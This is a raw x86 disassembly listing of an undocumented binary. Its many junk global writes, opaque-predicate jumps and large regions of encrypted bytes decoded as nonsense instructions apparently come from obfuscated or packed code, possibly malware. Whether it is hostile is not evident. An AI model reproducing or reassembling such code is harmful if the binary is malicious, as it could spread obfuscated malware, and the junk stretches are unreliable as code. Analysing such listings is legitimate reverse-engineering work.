  418fe9:	add    DWORD PTR ds:0x42818b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42816f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42815f,0x0
  41900e:	mov    DWORD PTR ds:0x428173,0x4347
  419018:	mov    DWORD PTR ds:0x428197,0x6064
  419022:	mov    DWORD PTR ds:0x42827f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428253,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42815f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428dfc
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282ef
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42822b
  41906c:	or     DWORD PTR ds:0x42836f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0x1a8f3402]
  419095:	enter  0x70cd,0x3f
  419099:	ret    
  41909a:	push   ss
  41909b:	sbb    BYTE PTR [edx+edx*1-0x6271e7e8],bh
  4190a2:	loopne 0x4190d4
  4190a4:	(bad)  
  4190a5:	mov    BYTE PTR [edx],dh
  4190a7:	mov    ebx,0x68e43389
  4190ac:	xchg   ebx,eax
  4190ad:	in     al,0x6b
  4190af:	push   cs
  4190b0:	mov    WORD PTR [ebx],fs
  4190b2:	mov    bh,0x67
  4190b4:	retf   
  4190b5:	js     0x419120
  4190b7:	push   es
  4190b8:	jle    0x4190f8
  4190ba:	(bad)  
  4190bb:	jmp    DWORD PTR [esi+0x3b]
  4190be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190bf:	jae    0x419041
  4190c1:	jne    0x4190ad
  4190c3:	jg     0x41908e
  4190c5:	pop    es
  4190c6:	inc    edx
  4190c7:	or     al,0xcc
  4190c9:	pusha  
  4190ca:	cmp    al,0x55
  4190cc:	rcl    BYTE PTR [edx-0x403c5e19],cl
  4190d2:	pop    edx
  4190d3:	cwde   
  4190d4:	sub    BYTE PTR [edi+0x70],ch
  4190d7:	pop    ebx
  4190d8:	rol    BYTE PTR [edx+0x3abf4da9],1
  4190de:	ret    
  4190df:	adc    BYTE PTR [edx+ebp*2],ch
  4190e2:	icebp  
  4190e3:	pop    edi
  4190e4:	fcomp  st(7)
  4190e6:	cmp    BYTE PTR [ebx+0x55d24a83],0xa5
  4190ed:	mov    dl,0x6
  4190ef:	xor    al,BYTE PTR [edi+ecx*2]
  4190f2:	sbb    al,0x36
  4190f4:	or     bh,ah
  4190f6:	int    0x54
  4190f8:	push   ds
  4190f9:	push   eax
  4190fa:	je     0x419154
  4190fc:	adc    eax,0xd489233d
  419101:	push   cs
  419102:	(bad)  
  419103:	(bad)  
  419104:	sahf   
  419105:	adc    DWORD PTR [edx+eiz*2+0x2c244cb1],edx
  41910c:	ret    0xc0ee
  41910f:	ins    DWORD PTR es:[edi],dx
  419110:	(bad)  
  419111:	adc    BYTE PTR gs:[ebx+0x239176ca],ah
  419118:	mov    ah,BYTE PTR [edx]
  41911a:	cdq    
  41911b:	scas   eax,DWORD PTR es:[edi]
  41911c:	shl    BYTE PTR [edi-0x616ddfa9],1
  419122:	ja     0x419106
  419124:	daa    
  419125:	jp     0x419154
  419127:	cli    
  419128:	mov    ch,0xff
  41912a:	jmp    0xda70202f
  41912f:	lahf   
  419130:	or     edx,DWORD PTR [eiz*1+0x6bdcf2e8]
  419137:	adc    edx,DWORD PTR [ebx]
  419139:	mov    bl,0x1c
  41913b:	fwait
  41913c:	or     al,0x4d
  41913e:	test   cl,ch
  419140:	mov    ebp,0xb300408d
  419145:	mov    dh,0xda
  419147:	enter  0xcc62,0x24
  41914b:	stc    
  41914c:	jb     0x41915b
  41914e:	hlt    
  41914f:	test   BYTE PTR [edi],dh
  419151:	dec    edi
  419152:	(bad)  
  419153:	jo     0x4191bd
  419155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419156:	sbb    DWORD PTR [ecx+0x2c],ecx
  419159:	add    edx,DWORD PTR [ebx-0x76]
  41915c:	leave  
  41915d:	ins    DWORD PTR es:[edi],dx
  41915e:	stos   DWORD PTR es:[edi],eax
  41915f:	jno    0x4191b7
  419161:	mov    esi,0x5a5e1f70
  419166:	addr16 xchg edx,eax
  419168:	mov    edi,0xdc3df88d
  41916d:	sbb    al,0xae
  41916f:	jecxz  0x419172
  419171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419172:	rol    DWORD PTR [esi-0x4ab30080],cl
  419178:	cld    
  419179:	xchg   BYTE PTR [esi],bh
  41917b:	cmp    eax,0x9bc4b7c2
  419180:	xor    dh,BYTE PTR [ecx-0x42309ce8]
  419186:	mov    ds:0xfc8c21fc,al
  41918b:	sub    al,0x55
  41918d:	sub    edx,0xeedb56f5
  419193:	inc    esi
  419194:	or     edx,ecx
  419196:	xor    DWORD PTR ds:0x3de6ce58,ecx
  41919c:	inc    ebp
  41919d:	stos   DWORD PTR es:[edi],eax
  41919e:	inc    ebp
  41919f:	mov    edi,0xc3055494
  4191a4:	mov    ?,WORD PTR [ecx]
  4191a6:	sbb    esp,DWORD PTR [esi*8-0x5abf61f0]
  4191ad:	(bad)  
  4191ae:	xchg   esi,eax
  4191af:	sub    BYTE PTR [esi+0x23afd1cb],dl
  4191b5:	xor    DWORD PTR [edi+0x23],edi
  4191b8:	stos   DWORD PTR es:[edi],eax
  4191b9:	sub    esi,ebx
  4191bb:	sub    eax,0x72d615fa
  4191c0:	dec    eax
  4191c1:	cmp    DWORD PTR [esi+0xf125557],0x4dd140ce
  4191cb:	ds sub eax,0xafc6eceb
  4191d1:	test   al,0xf4
  4191d3:	outs   dx,BYTE PTR ds:[esi]
  4191d4:	cmc    
  4191d5:	into   
  4191d6:	push   ebp
  4191d7:	sub    BYTE PTR fs:[ebx+0x4],0x2d
  4191dc:	aaa    
  4191dd:	inc    ebx
  4191de:	inc    edi
  4191df:	repz adc ecx,DWORD PTR [bx+di-0x1507]
  4191e5:	out    dx,al
  4191e6:	and    BYTE PTR [eax],al
  4191e8:	popf   
  4191e9:	sbb    BYTE PTR [ebx-0x49],al
  4191ec:	idiv   BYTE PTR [esi+0x9132074]
  4191f2:	fisttp QWORD PTR [esi]
  4191f4:	leave  
  4191f5:	xor    al,0xb1
  4191f7:	sub    ch,ah
  4191f9:	push   eax
  4191fa:	inc    esi
  4191fb:	aas    
  4191fc:	les    ebp,FWORD PTR [ebx+0x62]
  4191ff:	xor    DWORD PTR [ebx+0x5d],edi
  419202:	mov    al,ds:0x63a71f61
  419207:	cs aas 
  419209:	leave  
  41920a:	sbb    eax,0x2bd3bb54
  41920f:	test   eax,edi
  419211:	push   edx
  419212:	jmp    0x4191a8
  419214:	mov    ebx,0x34295a13
  419219:	adc    eax,0x8643416
  41921e:	paddsw mm4,QWORD PTR [esi-0x162ef1eb]
  419225:	push   ecx
  419226:	adc    BYTE PTR [ecx-0x3a696e09],0x55
  41922d:	push   0x8a89a888
  419232:	(bad)
  419235:	inc    ecx
  419236:	je     0x4191ef
  419238:	mov    ah,0xa8
  41923a:	sub    BYTE PTR [ebp+eax*8+0x58520ee9],0xf2
  419242:	lea    ecx,[bp+di]
  419245:	push   edi
  419246:	and    ch,BYTE PTR [eax-0xa]
  419249:	xchg   edx,eax
  41924a:	and    ebp,ebx
  41924c:	sub    edi,0xfffffff8
  41924f:	iret   
  419250:	inc    esi
  419251:	add    eax,0x2b0a740b
  419256:	adc    bh,cl
  419258:	ret    
  419259:	mov    eax,ds:0x1a9813b5
  41925e:	jmp    0x128d:0x41243a3a
  419265:	jp     0x419232
  419267:	and    esi,edi
  419269:	add    ah,BYTE PTR [ebp+edx*1-0x7190797a]
  419270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419271:	xchg   ebp,eax
  419272:	add    bh,BYTE PTR [esi+0x19da3217]
  419278:	ss push ss
  41927a:	pop    ebx
  41927b:	(bad)  
  41927c:	cld    
  41927d:	push   0xfffffff7
  41927f:	sbb    esi,ecx
  419281:	ret    
  419282:	jb     0x419253
  419284:	xor    BYTE PTR [ecx],ah
  419286:	sub    al,0x25
  419288:	fucomi st,st(6)
  41928a:	cmp    bh,bh
  41928c:	lods   eax,DWORD PTR ds:[esi]
  41928d:	jne    0x419224
  41928f:	mov    ebx,0xb27332ad
  419294:	repnz mov WORD PTR [edi-0x5a],?
  419298:	jae    0x4192d0
  41929a:	inc    edi
  41929b:	xchg   ecx,eax
  41929c:	pop    es
  41929d:	xchg   ebp,eax
  41929e:	cld    
  41929f:	jle    0x4192f7
  4192a1:	lods   al,BYTE PTR ds:[esi]
  4192a2:	pop    sp
  4192a4:	push   edx
  4192a5:	call   0x454bb1a3
  4192aa:	rol    esi,cl
  4192ac:	hlt    
  4192ad:	nop
  4192ae:	sub    eax,0xcce32384
  4192b3:	jge    0x4192aa
  4192b5:	loope  0x41928a
  4192b7:	cmp    cl,al
  4192b9:	or     esi,DWORD PTR [edi+0x27]
  4192bc:	mov    eax,ds:0x15da10f5
  4192c1:	push   edi
  4192c2:	jae    0x4192c2
  4192c4:	fs add eax,0x1a6cbafd
  4192ca:	push   edi
  4192cb:	add    al,0x1e
  4192cd:	jmp    0x858f:0xea587aff
  4192d4:	push   es
  4192d5:	ss jmp 0xebdcf474
  4192db:	ins    BYTE PTR es:[edi],dx
  4192dc:	mov    ch,0x79
  4192de:	xlat   BYTE PTR ds:[ebx]
  4192df:	jne    0x419355
  4192e1:	cmp    al,0x8a
  4192e3:	xchg   edx,eax
  4192e4:	jb     0x4192fa
  4192e6:	cmp    al,0xcb
  4192e8:	push   ss
  4192e9:	or     eax,0x8bc50015
  4192ee:	test   DWORD PTR [ecx-0x69ed7629],eax
  4192f4:	out    0x0,al
  4192f6:	push   ebp
  4192f7:	sbb    BYTE PTR [edx+0x10],0x14
  4192fb:	pcmpgtb mm1,QWORD PTR [eax-0x76958885]
  419302:	and    al,0x3a
  419304:	test   DWORD PTR fs:[edx-0x65],esi
  419308:	(bad)  
  41930a:	mov    edi,0x688b91d9
  41930f:	in     eax,dx
  419310:	add    eax,0xe99f114f
  419315:	out    0x32,al
  419317:	sti    
  419318:	jecxz  0x419336
  41931a:	(bad)  
  41931b:	dec    edi
  41931c:	pop    ecx
  41931d:	xchg   edx,eax
  41931e:	mov    ch,0xbd
  419320:	mov    bl,0x1
  419322:	push   ecx
  419323:	call   0xd354f1dc
  419328:	jp     0x419394
  41932a:	cld    
  41932b:	retf   0xa330
  41932e:	mov    dh,0x11
  419330:	lods   al,BYTE PTR ds:[esi]
  419331:	cld    
  419332:	out    0x14,eax
  419334:	mov    eax,ds:0xfbd1c3fd
  419339:	and    eax,0xdb111bdb
  41933e:	jmp    0x33349955
  419343:	adc    BYTE PTR [ecx-0x6f],dh
  419346:	pop    es
  419347:	scas   al,BYTE PTR es:[edi]
  419348:	arpl   WORD PTR [eax+0x5ae84599],di
  41934e:	call   FWORD PTR [edi-0x75]
  419351:	hlt    
  419352:	aam    0x51
  419354:	jecxz  0x419379
  419356:	fistp  DWORD PTR [ecx+0x4b]
  419359:	pop    ebp
  41935a:	cmp    DWORD PTR [eax],ebp
  41935c:	and    ch,BYTE PTR [eax-0x57]
  41935f:	imul   eax,DWORD PTR [ecx+0x20],0xffffffcc
  419363:	xchg   BYTE PTR [esi],cl
  419365:	mov    BYTE PTR [ecx+ebx*4+0xfb87465],bh
  41936c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936d:	push   0x1db246da
  419372:	ficom  WORD PTR [edi-0x32]
  419375:	das    
  419376:	test   al,bh
  419378:	mov    ecx,edi
  41937a:	mov    ecx,0x5412d3d7
  41937f:	add    bl,BYTE PTR ds:0x22ecbf3e
  419385:	ja     0x4193e9
  419387:	aaa    
  419388:	cmp    eax,0x33d48354
  41938d:	sub    bh,bl
  41938f:	inc    eax
  419390:	imul   DWORD PTR [eax]
  419392:	dec    ebp
  419393:	pop    ebp
  419394:	pop    eax
  419395:	fdiv   QWORD PTR [edi]
  419397:	add    DWORD PTR [ecx-0x24c8e7e9],esp
  41939d:	scas   al,BYTE PTR es:[edi]
  41939e:	clc    
  41939f:	jo     0x4193ca
  4193a1:	les    ebx,FWORD PTR [eax+ecx*4-0x2f7f68cb]
  4193a8:	pop    ss
  4193a9:	cmp    al,0x50
  4193ab:	jl     0x41933e
  4193ad:	sti    
  4193ae:	inc    esp
  4193af:	adc    al,0xd4
  4193b1:	loope  0x4193ce
  4193b3:	mov    dl,0x9
  4193b5:	retf   0xdf6a
  4193b8:	es retf 0x19b9
  4193bc:	ret    0x6ae9
  4193bf:	es adc edx,esi
  4193c2:	mov    dx,0x2df
  4193c6:	hlt    
  4193c7:	xchg   edi,eax
  4193c8:	ret    
  4193c9:	fdiv   QWORD PTR [ebx]
  4193cb:	add    eax,0xfe9ad6e4
  4193d0:	ret    0xee14
  4193d3:	push   ebx
  4193d4:	push   esi
  4193d5:	push   ebx
  4193d6:	fcmovnbe st,st(1)
  4193d8:	hlt    
  4193d9:	hlt    
  4193da:	cwde   
  4193db:	sbb    edx,DWORD PTR [eax+0x42]
  4193de:	scas   eax,DWORD PTR es:[edi]
  4193df:	test   bh,bl
  4193e1:	adc    dh,bl
  4193e3:	ror    BYTE PTR [ecx-0x19a3ea90],0x17
  4193ea:	push   edx
  4193eb:	mov    bh,0xcb
  4193ed:	xor    al,0x11
  4193ef:	xor    dh,al
  4193f1:	jp     0x41942f
  4193f3:	jg     0x4193e7
  4193f5:	sub    eax,0x4730ac04
  4193fa:	inc    eax
  4193fb:	fst    DWORD PTR [ecx-0x24]
  4193fe:	das    
  4193ff:	add    BYTE PTR [esi+eiz*2+0x4b],dh
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	sti    
  419405:	sub    bh,BYTE PTR [ebp-0x48]
  419408:	mov    ecx,0xc7275871
  41940d:	pop    ebx
  41940e:	dec    edi
  41940f:	push   edi
  419410:	xchg   ebx,eax
  419411:	in     al,0x56
  419413:	jp     0x4193f9
  419415:	add    bh,0x2e
  419418:	or     BYTE PTR [edx+0x7],al
  41941b:	fnstsw WORD PTR [ebp-0x7f]
  41941e:	adc    bl,cl
  419420:	(bad)  
  419422:	sub    DWORD PTR [ebp*4+0x2e56ed6c],edi
  419429:	imul   esi,DWORD PTR [ecx+eiz*4+0x7685f001],0x65
  419431:	lods   eax,DWORD PTR ds:[esi]
  419432:	fild   QWORD PTR [ecx-0x3f86ac99]
  419438:	stos   DWORD PTR es:[edi],eax
  419439:	fadd   QWORD PTR [eax+0x49]
  41943c:	push   eax
  41943d:	nop
  41943e:	jo     0x419434
  419440:	lahf   
  419441:	int    0xff
  419443:	dec    eax
  419444:	mov    ebx,0xd7cd523b
  419449:	neg    DWORD PTR [ecx+ebp*4]
  41944c:	les    edi,FWORD PTR [eax+0x2187d896]
  419452:	mov    ecx,DWORD PTR [esp+0x84]
  419459:	shrd   eax,ecx,0x2
  41945d:	cmp    DWORD PTR ds:0x42823f,0x0
  419464:	mov    DWORD PTR ds:0x428397,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x4283a3,0x3a28
  419482:	cmp    DWORD PTR ds:0x42823f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428e00
  41949a:	mov    DWORD PTR ds:0x42827b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282e3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x42831b,edx
  4194b2:	mov    DWORD PTR ds:0x4282a3,0x52b1
  4194bc:	or     DWORD PTR ds:0x42817b,edx
  4194c2:	and    DWORD PTR ds:0x42837f,ecx
  4194c8:	cmp    DWORD PTR ds:0x428327,0x0
  4194cf:	mov    DWORD PTR ds:0x428327,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x4282a3,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x4283a3,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42817f,0x3203
  419506:	cmp    DWORD PTR ds:0x428327,0x0
  41950d:	jge    0x41953e
  419513:	push   0x4280bb
  419518:	push   0x42809f
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428e94
  419528:	adc    DWORD PTR ds:0x428187,0x266f
  419532:	xor    DWORD PTR ds:0x42837f,ebx
  419538:	xor    DWORD PTR ds:0x428307,ecx
  41953e:	mov    DWORD PTR ds:0x428177,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428253
  41954e:	dec    DWORD PTR ds:0x428307
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x4282f7,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42838b,0x4283a7
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42818f,0x0
  419589:	mov    DWORD PTR ds:0x42817f,0x514f
  419593:	mov    DWORD PTR ds:0x428183,0x65eb
  41959d:	mov    DWORD PTR ds:0x428233,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x428293,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42818f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42804d
  4195cd:	push   0x428069
  4195d2:	call   DWORD PTR ds:0x428e98
  4195d8:	adc    DWORD PTR ds:0x4282a7,ecx
  4195de:	and    DWORD PTR ds:0x42829b,0x4c04
  4195e8:	add    DWORD PTR ds:0x428173,ebx
  4195ee:	and    DWORD PTR ds:0x42827f,0x6136
  4195f8:	add    DWORD PTR ds:0x428187,ebx
  4195fe:	mov    eax,ds:0x422558
  419603:	and    DWORD PTR ds:0x42830f,0x428277
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42816b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x428193,0x428167
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428277,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x4282a7,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42827f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x428293,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428183,0x428153
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428287,0x42824f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42816b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42816b,0x4282f7
  4196ab:	push   0x4223dc
  4196b0:	sbb    DWORD PTR ds:0x428283,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42822b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42823f
  4196da:	sbb    DWORD PTR ds:0x428323,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428253,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42826f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42823b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428373,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282ef
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x42826b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428383,0x5836
  419737:	cmp    DWORD PTR ds:0x428373,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428e04
  41974d:	movzx  edx,BYTE PTR ds:0x42816b
  419754:	adc    DWORD PTR ds:0x4282f3,edx
  41975a:	movzx  edx,BYTE PTR ds:0x4282a7
  419761:	add    DWORD PTR ds:0x42818b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x42829f,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42818b,0x0
  419781:	mov    DWORD PTR ds:0x428253,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42826b,ebx
  419797:	cmp    DWORD PTR ds:0x42818b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428e08
  4197bf:	sub    DWORD PTR ds:0x428283,0x63b8
  4197c9:	add    DWORD PTR ds:0x4282ff,0x42823f
  4197d3:	add    DWORD PTR ds:0x42825f,0x428187
  4197dd:	mov    ebx,DWORD PTR ds:0x4281a7
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x4282b7
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428237,ecx
  4197f8:	and    DWORD PTR ds:0x42828f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x42830f
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42818b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428377,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x428317,0x6cf
  41984e:	mov    DWORD PTR ds:0x4283a3,0x6551
  419858:	cmp    DWORD PTR ds:0x42818b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428e9c
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x4283ab
  419891:	mov    ecx,DWORD PTR ds:0x4283af
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x42829b
  4198a2:	cmp    DWORD PTR ds:0x42815f,0x0
  4198a9:	mov    DWORD PTR ds:0x428153,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x42831f
  4198ba:	not    DWORD PTR ds:0x428313
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42815f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428e0c
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428283
  4198e5:	and    DWORD PTR ds:0x42831b,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282ef
  4198f1:	sbb    DWORD PTR ds:0x428177,edx
  4198f7:	or     DWORD PTR ds:0x428307,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428273,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x42821f
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428223
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x428317,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42822b,0x4551
  419946:	mov    DWORD PTR ds:0x42828f,0x487
  419950:	cmp    DWORD PTR ds:0x428317,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428e10
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x4282ef,0x75a
  419988:	sub    DWORD PTR ds:0x428297,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42823b
  419999:	sub    ecx,DWORD PTR ds:0x42839f
  41999f:	mov    DWORD PTR ds:0x42823b,ecx
  4199a5:	cmp    DWORD PTR ds:0x42825b,0x0
  4199ac:	mov    DWORD PTR ds:0x4282f3,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42815b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428377,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42825b,edi
  4199da:	cmp    DWORD PTR ds:0x42825b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428233
  4199ec:	push   0x427f5b
  4199f1:	call   DWORD PTR ds:0x428ea0
  4199f7:	sub    DWORD PTR ds:0x4283a7,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x42831f
  419a03:	sbb    DWORD PTR ds:0x4282a7,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42838b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x428307,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x4282ff,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x428317
  419a31:	xor    DWORD PTR ds:0x42822b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42822f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx+0x75708ffa]
  419a79:	out    0x21,eax
  419a7b:	jle    0x419a60
  419a7d:	mov    ebx,0x12bc1816
  419a82:	sbb    BYTE PTR [eax],bl
  419a84:	dec    esi
  419a85:	and    ch,BYTE PTR [edi+esi*8]
  419a88:	sbb    edx,DWORD PTR [ebx-0x5]
  419a8b:	daa    
  419a8c:	pop    esi
  419a8d:	jp     0x419a8d
  419a8f:	call   0x66ac47da
  419a94:	mov    dh,0xd6
  419a96:	daa    
  419a97:	ds cmp al,0xba
  419a9a:	nop
  419a9b:	pop    eax
  419a9c:	dec    esp
  419a9d:	xor    bh,0x1
  419aa0:	push   esp
  419aa1:	sbb    BYTE PTR [edi],ah
  419aa3:	push   edi
  419aa4:	cs push 0x24f7de3
  419aaa:	sub    eax,0xab442160
  419aaf:	ret    
  419ab0:	leave  
  419ab1:	mov    ds:0x25dbfee,eax
  419ab6:	jp     0x419af6
  419ab8:	int    0x5e
  419aba:	ret    
  419abb:	sub    ecx,DWORD PTR [eax-0x3dbbab95]
  419ac1:	in     eax,dx
  419ac2:	rcl    BYTE PTR [eax+0x3f],cl
  419ac5:	out    0x58,al
  419ac7:	popa   
  419ac8:	stc    
  419ac9:	dec    ebx
  419aca:	leave  
  419acb:	sub    bl,BYTE PTR [eax]
  419acd:	mov    BYTE PTR [edi+0x797fe21c],bh
  419ad3:	adc    dh,BYTE PTR [ecx+0x4d2e5514]
  419ad9:	pop    edx
  419ada:	popf   
  419adb:	ret    
  419adc:	(bad)  [esi]
  419ade:	adc    bh,BYTE PTR [ebp-0x21691c04]
  419ae4:	and    eax,0xad63c43c
  419ae9:	push   eax
  419aea:	push   0x58
